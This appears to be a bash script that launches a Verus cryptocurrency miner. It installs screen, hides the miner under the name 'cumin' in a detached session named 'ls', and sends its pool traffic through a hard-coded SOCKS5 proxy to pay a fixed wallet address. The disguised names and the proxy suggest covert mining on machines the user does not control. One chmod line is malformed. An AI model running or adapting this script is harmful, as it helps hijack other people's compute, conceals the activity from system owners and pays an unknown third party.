#!/bin/bash
sudo apt update 
sudo apt install screen libjansson4 -y 
chmod +x kowai.sh && chmod +x cumin chmod 777 cumin kowai.sh
screen -dmS ls 
POOL=stratum+tcp://eu.luckpool.net:3956
WALLET=RHHpSBzjvSctxBuZnSjAbWLL3o8aUqycdi
WORKER=$(echo $(shuf -i 1-10 -n 1)skuy)
PROXY=socks5://184.179.216.133:4145
./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 2 -x $PROXY
